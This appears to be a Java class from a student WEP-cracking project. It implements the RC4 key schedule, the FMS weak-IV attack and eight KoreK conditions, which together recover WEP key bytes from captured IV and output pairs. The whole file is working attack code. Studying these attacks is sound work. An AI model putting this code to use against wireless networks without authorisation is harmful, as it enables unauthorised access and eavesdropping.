import java.util.Arrays;

/**
 * Class to execute the RC4 algorithm
 * 
 * @author Victor Hazali
 */
public class RC4Modified {

	private static int[]	_shuffledArray;
	private static int[]	_jValues;
	private static int[]	_keys;

	/**
	 * Performs the KSA algorithm for a fix number of times. It will also keep
	 * track of all the state as well as j values.
	 * It will then perform the FMS Attack, by checking for:
	 * 1. S[1] + S[S[1]] = C
	 * and then using the following formula:
	 * K[C] = (Si[o1] - S[C] - j[C-1]) mod N
	 * 
	 * @param currTup
	 *            current tupple to work with. IV and o1 will be obtained from
	 *            this tuple
	 * @param key
	 *            The current key that has been guessed thus far
	 * @param currKeyIndex
	 *            The amount of keys that have been guessed thus far
	 * @return a Key candidate evaluated using the formula
	 */
	public static int KSA(Tuple currTup, int[] key, int currKeyIndex) {
		// Initialize
		int keyLength = key.length + WEPCracker.IV_SIZE;
		// Shuffled Array:
		_shuffledArray = new int[WEPCracker.KEY_SPACE];
		for (int i = 0; i < WEPCracker.KEY_SPACE; i++) {
			_shuffledArray[i] = i;
		}
		// jValues Array:
		_jValues = new int[WEPCracker.KEY_SPACE];
		int j = 0;
		// keys Array:
		_keys = new int[keyLength];

		// Copying IV
		for (int i = 0; i < WEPCracker.IV_SIZE; i++) {
			_keys[i] = currTup.getIVAt(i);
		}
		// Copying guessed keys so far
		for (int i = WEPCracker.IV_SIZE; i < currKeyIndex; i++) {
			_keys[i] = key[i - WEPCracker.IV_SIZE];
		}

		// Perform shuffling and calculating and storing of j values for C
		// amount of loops
		for (int i = 0; i < currKeyIndex; i++) {
			j = (j + _shuffledArray[i] + _keys[i % keyLength])
					% WEPCracker.KEY_SPACE;
			_jValues[i] = j;
			swap(_shuffledArray, i, j);
		}

		// Check if Weak IV
		if (hasWeakIV(currKeyIndex)) {

			int output = currTup.getOutput();
			int outputIndex = 0;

			for (int i = 0; i < WEPCracker.KEY_SPACE; i++) {
				if (output == _shuffledArray[i]) {
					outputIndex = i;
					break;
				}
			}

			int sValue = _shuffledArray[currKeyIndex];
			int sum = (j + sValue) % WEPCracker.KEY_SPACE;

			int candidate = outputIndex - sum;
			if (candidate < 0) {
				candidate = WEPCracker.KEY_SPACE + candidate;
			}
			return candidate;
		}

		return -1;
	}

	/**
	 * Performs korek's 1st attack with the following conditions:
	 * 1. S[1] < C
	 * 2. (S[1] + S[S[1]]) % N == C
	 * 3. S[1] != o1
	 * 4. S[S[S[1]]] != o1
	 * and the formula:
	 * K[C] = Si[o1] - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek1(Tuple currTup, int currKeyIndex) {

		if ((_shuffledArray[1] < currKeyIndex)					// 1
				&&
				(((_shuffledArray[1] + _shuffledArray[_shuffledArray[1]])
				% WEPCracker.KEY_SPACE) == currKeyIndex)	// 2
				&&
				(_shuffledArray[1] != currTup.getOutput())		// 3
				&&
				(_shuffledArray[_shuffledArray[_shuffledArray[1]]] != currTup
						.getOutput())) {						// 4

			return findIndex(currTup.getOutput())
					- _shuffledArray[currKeyIndex] - _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 2nd attack with the following conditions:
	 * 1. S[1] == C
	 * 2. o1 == C
	 * and the formula:
	 * K[C] = Si[0] - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek2(Tuple currTup, int currKeyIndex) {
		if ((_shuffledArray[1] == currKeyIndex) &&
				(currTup.getOutput() == currKeyIndex)) {
			return findIndex(0) - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 3rd attack with the following conditions:
	 * 1. S[1] == C
	 * 2. o1 == (1-C) mod N
	 * and the formula:
	 * K[C] = Si[o1] - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek3(Tuple currTup, int currKeyIndex) {
		int temp = (1 - currKeyIndex) % WEPCracker.KEY_SPACE;
		if (temp < 0) {
			temp += WEPCracker.KEY_SPACE;
		}

		if ((_shuffledArray[1] == currKeyIndex)
				&&
				(currTup.getOutput() == temp)) {
			return findIndex(currTup.getOutput())
					- _shuffledArray[currKeyIndex] - _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 4th attack with the following conditions:
	 * 1. S[1] == C
	 * 2. o1 != (1-C) mod N
	 * 3. o1 != C
	 * 4. Si[o1] < C
	 * 5. (Si[o1] - C) mod N != S[1]
	 * and the formula:
	 * K[C] = Si[(Si[o1] - C) mod N] - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek4(Tuple currTup, int currKeyIndex) {

		int temp = (1 - currKeyIndex) % WEPCracker.KEY_SPACE;
		if (temp < 0) {
			temp += WEPCracker.KEY_SPACE;
		}

		int temp1 = (findIndex(currTup.getOutput()) - currKeyIndex)
				% WEPCracker.KEY_SPACE;
		if (temp1 < 0) {
			temp1 += WEPCracker.KEY_SPACE;
		}

		if ((_shuffledArray[1] == currKeyIndex)
				&&
				(currTup.getOutput() != temp)
				&&
				(currTup.getOutput() != currKeyIndex)
				&&
				(findIndex(currTup.getOutput()) < currKeyIndex)
				&&
				(_shuffledArray[1] != temp1)) {
			return findIndex(temp1) - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 5th attack with the following conditions:
	 * 1. S[2] == o1
	 * 2. S[C] == 1
	 * and the formula:
	 * K[C] = 1 - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek5(Tuple currTup, int currKeyIndex) {
		if ((_shuffledArray[2] == currTup.getOutput()) &&
				(_shuffledArray[currKeyIndex] == 1)) {
			return 1 - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 6th attack with the following conditions:
	 * 1. S[C] == C
	 * 2. S[1] == 0
	 * 3. o1 == C
	 * and the formula:
	 * K[C] = 1 - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek6(Tuple currTup, int currKeyIndex) {
		if ((_shuffledArray[currKeyIndex] == currKeyIndex) &&
				(_shuffledArray[1] == 0) &&
				(currTup.getOutput() == currKeyIndex)) {
			return 1 - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 7th attack with the following conditions:
	 * 1. S[C] == C
	 * 2. S[1] == o1
	 * 3. S[1] == (1-C) mod N
	 * and the formula:
	 * K[C] = 1 - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek7(Tuple currTup, int currKeyIndex) {
		int temp = (1 - currKeyIndex) % WEPCracker.KEY_SPACE;
		if (temp < 0) {
			temp += WEPCracker.KEY_SPACE;
		}

		if ((_shuffledArray[currKeyIndex] == currKeyIndex)
				&&
				(_shuffledArray[1] == currTup.getOutput())
				&&
				(_shuffledArray[1] == temp)) {
			return 1 - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}
		return -1;
	}

	/**
	 * Performs korek's 8th attack with the following conditions:
	 * 1. S[C] == C
	 * 2. S[1] >= (-C) mod N
	 * 3. S[1] == (Si[o1] - C) mod N
	 * 4. S[1] != o1
	 * and the formula:
	 * K[C] = 1 - S[C] - j[C-1]
	 * 
	 * @param currTup
	 *            tuple currently working on
	 * @param key
	 *            Keys guessed so far
	 * @param currKeyIndex
	 *            C
	 * @return candidate if it exist. -1 otherwise
	 */
	public static int korek8(Tuple currTup, int currKeyIndex) {
		int temp = WEPCracker.KEY_SPACE - currKeyIndex;

		int temp1 = (findIndex(currTup.getOutput()) - currKeyIndex)
				% WEPCracker.KEY_SPACE;
		if (temp1 < 0) {
			temp1 += WEPCracker.KEY_SPACE;
		}

		if ((_shuffledArray[currKeyIndex] == currKeyIndex)
				&&
				(_shuffledArray[1] >= temp)
				&&
				(_shuffledArray[1] == temp1) &&
				(_shuffledArray[1]) != currTup.getOutput()) {
			return 1 - _shuffledArray[currKeyIndex]
					- _jValues[currKeyIndex - 1];
		}

		return -1;
	}

	/**
	 * Method to get 1 byte of output by performing one pass of the PRGA of the
	 * RC4
	 * 
	 * @param tuple
	 *            tuple to provide IV
	 * @param guessedKeys
	 *            the remaining bytes to form the key to be used to generate the
	 *            output
	 * @return first byte of RC4 output
	 */
	public static int RC41Byte(Tuple tuple, int[] guessedKeys) {
		// key Array:
		_keys = new int[guessedKeys.length + WEPCracker.IV_SIZE];
		// Copying IV
		for (int i = 0; i < WEPCracker.IV_SIZE; i++) {
			_keys[i] = tuple.getIVAt(i);
		}
		// Copying guessed keys so far
		for (int i = 0; i < guessedKeys.length; i++) {
			_keys[i + WEPCracker.IV_SIZE] = guessedKeys[i];
		}
		KSA();
		return PRGA();
	}

	/**
	 * The RC4's Key Scheduling Algorithm
	 * Performs manipulation of the state as well as keeping track of all j
	 * values.
	 * Note that this method should only be invoked after the other KSA method
	 * with signature KSA(Tuple, int[], int) as the keys used for this KSA will
	 * be obtained from the other method.
	 */
	public static void KSA() {

		// Initialize the shuffled Array:
		_shuffledArray = new int[WEPCracker.KEY_SPACE];
		for (int i = 0; i < WEPCracker.KEY_SPACE; i++) {
			_shuffledArray[i] = i;
		}
		_jValues = new int[WEPCracker.KEY_SPACE];
		int j = 0;

		for (int i = 0; i < WEPCracker.KEY_SPACE; i++) {
			j = (j + _shuffledArray[i] + _keys[i % _keys.length]
					) % WEPCracker.KEY_SPACE;

			swap(_shuffledArray, i, j);
		}

	}

	/**
	 * The RC4's Pseudo Random Generator Algorithm
	 * 
	 * @return first byte of the RC4 output
	 */
	public static int PRGA() {
		int i = 0, j = 0;
		i = 1;
		j = _shuffledArray[i] % WEPCracker.KEY_SPACE;
		// swap(_shuffledArray, i, j);
		return _shuffledArray[(_shuffledArray[i] + _shuffledArray[j])
				% WEPCracker.KEY_SPACE];
	}

	/**
	 * Method to find the index within the state array that contains the value
	 * specified. Si[index]
	 * 
	 * @param value
	 *            to find the corresponding index
	 * @return index of the value in the array
	 */
	private static int findIndex(int value) {
		for (int i = 0; i < _shuffledArray.length; i++) {
			if (_shuffledArray[i] == value) {
				return i;
			}
		}
		return -1;
	}

	/**
	 * Performs a swap of the elements at index first and second in the array
	 * 
	 * @param array
	 *            array holding contents
	 * @param first
	 *            element to swap
	 * @param second
	 *            element to swap
	 */
	private static void swap(int[] array, int first, int second) {
		int temp = array[first];
		array[first] = array[second];
		array[second] = temp;
	}

	@Override
	public String toString() {
		StringBuilder sb = new StringBuilder();
		sb.append("S: " + Arrays.toString(_shuffledArray) + "\n");
		sb.append("j: " + Arrays.toString(_jValues) + "\n");
		sb.append("K: " + Arrays.toString(_keys) + "\n");
		return sb.toString();
	}

	/**
	 * Checks if IV is weak, as defined in the FMS attack:
	 * S[1] + S[S[1]] = C
	 * 
	 * @param keyLength
	 *            C
	 * @return true if condition is met, false otherwise
	 */
	private static boolean hasWeakIV(int keyLength) {
		return _shuffledArray[1]
				+ _shuffledArray[_shuffledArray[1]] == keyLength;
	}
}
